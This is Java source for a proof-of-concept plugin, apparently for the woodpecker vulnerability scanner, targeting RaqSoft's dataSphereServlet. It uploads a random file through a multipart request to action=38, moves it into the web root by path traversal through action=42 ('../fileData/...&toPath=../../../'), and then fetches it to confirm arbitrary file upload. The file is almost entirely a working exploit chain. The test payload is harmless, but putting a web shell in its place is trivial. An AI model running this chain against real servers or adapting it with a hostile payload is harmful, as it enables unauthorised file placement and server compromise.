package plugins.vul.raqsoft;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.requests.body.Part;
import me.gv7.woodpecker.tools.misc.RandomUtil;
import plugins.vul.spring.cloud.gateway.CVE_2022_22947_Plugin;

public class DataSphereServlet_ArbitraryFileUpload_POC implements IPoc {
    private IPluginHelper helper;
    private IVulPluginCallbacks callbacks;

    public DataSphereServlet_ArbitraryFileUpload_POC() {
        callbacks = CVE_2022_22947_Plugin.vulPluginCallbacks;
        helper = callbacks.getPluginHelper();
    }

    @Override
    public IScanResult doVerify(ITarget iTarget, IResultOutput iResultOutput) throws Throwable {
        IScanResult result = helper.createScanResult();
        String target = iTarget.getAddress();
        String filename = RandomUtil.getRandomString(5) + ".x";
        String content = RandomUtil.getRandomString(5);
        RawResponse response = Requests.post(target + "/servlet/dataSphereServlet?action=38")
                .multiPartBody(
                        Part.file("openGrpxFile",filename,content.getBytes()),
                        Part.text("path",""),
                        Part.text("saveServer","1"))
                .send();

        if (response.readToText().contains(String.format("parent.openFileCallback(null,\"/%s\");", filename))){
            iResultOutput.successPrintln("任意文件上传成功");
        } else {
            iResultOutput.successPrintln("任意文件上传失败");
            result.setExists(false);
        }

        iResultOutput.infoPrintln("尝试任意文件移动");
        Requests.get(target + "/servlet/dataSphereServlet?action=42&file=../fileData/"+filename+"&toPath=../../../")
                .send();


        response = Requests.get(target+"/"+filename)
                .send();
        if (response.readToText().contains(content)){
            iResultOutput.successPrintln("dataSphereServlet接口存在任意文件上传漏洞");
            result.setExists(true);
            result.setTarget(target);
        } else {
            result.setExists(false);
        }
        return result;
    }
}
